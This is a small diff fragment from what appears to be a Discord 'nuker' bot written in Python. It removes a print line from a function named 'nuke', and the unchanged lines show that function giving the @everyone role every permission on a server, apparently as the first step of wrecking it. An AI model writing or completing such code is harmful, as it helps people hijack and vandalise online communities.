@@ -42,7 +42,6 @@ async def orgia(ctx):
   
 @client.event
 async def nuke(guild):  
-print(f"{C.WHITE}Nuking {guild.name}.")
   role = discord.utils.get(guild.roles, name = "@everyone")
   try:
     await role.edit(permissions = discord.Permissions.all())
